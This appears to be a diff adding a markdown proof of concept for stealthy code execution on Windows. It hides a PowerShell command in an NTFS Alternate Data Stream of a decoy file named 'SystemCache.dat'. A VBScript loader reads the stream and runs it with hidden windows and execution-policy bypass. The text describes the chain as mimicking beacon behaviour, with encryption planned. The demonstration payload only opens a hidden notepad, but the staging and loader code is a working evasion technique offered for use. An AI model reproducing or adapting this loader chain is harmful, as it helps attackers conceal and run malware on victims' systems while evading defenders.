@@ -1,0 +1,94 @@
+
+
+## 🔬 Proof-of-Concept for ADS Execution
+
+This PoC will demonstrate that the VBScript can read the non-file content from the ADS stream and execute it seamlessly via PowerShell.
+
+### Step 1: Generate the PoC PowerShell Command
+
+This command is designed to launch a native Windows process (`notepad.exe`) that is a common target for in-memory injection, establishing process hierarchy that mimics beacon functionality. **Crucially, this command is complex enough to require an in-memory execution shell. (doubt on this claim, but this is a goal)**
+
+#### **PoC Plaintext Command**
+
+```powershell
+$mem = @(0..10MB); Start-Process -FilePath notepad.exe -WindowStyle Hidden; Write-Host 'ADS Execution Successful. In-Memory Process started: notepad.exe';
+```
+
+#### **Encoding for VBScript Execution**
+
+The VBScript executes PowerShell with the `-Command` flag, meaning the data read from ADS must be the raw PowerShell script contents. This will later be encrypted - simplified for PoC.
+
+
+### Step 1: ADS Staging (PowerShell Console)
+
+Run the following commands in an elevated PowerShell terminal on the target host to set up the ADS artifact.
+
+```powershell
+# Define the Paths
+$DatPath = 'C:\Temp\SystemCache.dat' # Using C:\Temp for simplicity - can exist anywhere
+$ADSStream = "$DatPath`:syc_core"
+$ADSContent = '$mem = @(0..10MB); Start-Process -FilePath notepad.exe -WindowStyle Hidden; Write-Host ''ADS Execution Successful. In-Memory Process started: notepad.exe'';'
+
+# 1. Find a directory to use or create your own
+
+# 2. Use an existing host file or create your own
+
+# 3. Write the PoC command string to the ADS stream (using the name “syc_core” for PoC)
+$ADSContent | Set-Content -Path “FULLFILEPATH” -Stream “syc_core”
+
+# can use lines below to create a script or multiline powershell command with the line above to perform checks
+
+Write-Host "ADS PoC Staging Complete."
+Write-Host (Get-Item $DatPath).BaseName # Checking file attributes - Should be 'SystemCache'
+Write-Host (Get-Item $ADSStream -Stream syc_core).Length # Checking stream size - Should be non-zero"
+```
+
+### Step 2: VBScript Execution (The Loader)
+
+The VBScript reads the content from the ADS and executes it. Save the following content to a file named `ads_poc.vbs` in the same directory (`C:\Temp`). - use any file/directory, just be consistent
+
+```vbscript
+' C:\Temp\ads_poc.vbs
+' ADS-Drop-System PoC Loader
+
+On Error Resume Next
+Set WshShell = CreateObject("WScript.Shell")
+
+' Path to the Alternate Data Stream
+ADSPath = "C:\Temp\SystemCache.dat:syc_core"
+
+' --- 1. Read PowerShell Script from ADS ---
+Set objStream = CreateObject("ADODB.Stream")
+objStream.Type = 2 ' Specify text mode.
+objStream.Charset = "utf-8"
+objStream.Open
+
+objStream.LoadFromFile ADSPath
+PowerShellScript = objStream.ReadText
+
+objStream.Close
+Set objStream = Nothing
+
+' --- 2. Execute PowerShell Script (The ADS content) ---
+' Note: We are using -Command, as the ADS content is the raw script/command to run.
+PowerShellCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command """ & PowerShellScript & """"
+WshShell.Run PowerShellCmd, 0, True ' Use True to wait for execution to see output immediately.
+
+Set WshShell = Nothing
+```
+
+### Step 4: Execution Test
+
+Execute the VBScript from a shell (or double-click it):
+
+```powershell
+cscript.exe //NOLOGO C:\Temp\ads_poc.vbs
+```
+
+You should observe the following:
+
+1.  A new `notepad.exe` process will appear (usually hidden, but you can see it in Task Manager).
+2.  The parent chain for `notepad.exe` will be `wscript.exe` -> `powershell.exe` -> `notepad.exe`. (Pretty sure it showed up as ads_poc.vbs -> notepad.exe)
+3.  The text "ADS Execution Successful. In-Memory Process started: notepad.exe" will be printed to the console (because our PoC script used `Write-Host`). (I did not receive this in testing, don’t know why yet)
+
+This confirms the complete, stealthy execution chain: **VBScript** $\to$ **ADS Read** $\to$ **PowerShell Execution** $\to$ **In-Memory Process Creation**.
